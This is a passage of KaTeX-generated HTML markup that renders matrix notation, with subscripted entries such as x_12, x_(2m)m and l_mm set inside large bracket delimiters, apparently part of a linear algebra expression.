style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.687499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5674999999999997em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mclose mtight\">)</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:0.2924999999999998em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.492499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.7em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-7.499999999999999em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-5.64em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.44em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-2.5799999999999996em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.3799999999999997em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:0.4799999999999998em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.679999999999999em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.8875em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.687499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5674999999999997em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mclose mtight\">)</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:0.2924999999999998em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.492499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.950085000000001em;\"><span style=\"top:1.6500649999999992em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎠</span></span></span><span style=\"top:0.5000549999999994em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-0.09495500000000094em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-0.6899650000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-1.2849750000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-1.8799850000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-2.474995000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.0700050000000014em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.6650150000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-4.260025000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-4.855035000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-5.450045000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.0450550000000005em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.640065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.710065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-7.950085000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎞</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.450085em;\"><span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.950035em;\"><span style=\"top:-1.3499850000000007em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎝</span></span></span><span style=\"top:-2.4999950000000006em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.0950050000000005em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.6900150000000003em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.7100150000000007em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-4.950035000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎛</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4500349999999997em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.9799999999999995em;\"><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5675000000000006em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4799999999999995em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.9799999999999995em;\"><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5675000000000006em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4799999999999995em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.9799999999999995em;\"><span style=\"top:-5.64em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-4.44em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-2.5799999999999996em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.3800000000000006em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4799999999999995em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.9799999999999995em;\"><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5675000000000006em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4799999999999995em;\"><span></span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.950035em;\"><span style=\"top:-1.3499850000000007em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎠</span></span></span><span style=\"top:-2.4999950000000006em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.0950050000000005em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.6900150000000003em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.7100150000000007em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-4.950035000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎞</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4500349999999997em;\"><span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:11.04em;vertical-align:-5.27em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.650080000000003em;\"><span style=\"top:1.3500599999999987em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎝</span></span></span><span style=\"top:0.20004999999999878em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-0.3949600000000015em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-0.9899700000000017em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-1.5849800000000018em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-2.179990000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-2.7750000000000017em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.3700100000000015em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.9650200000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-4.560030000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-5.155040000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-5.750050000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.345060000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.410060000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-7.650080000000003em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span 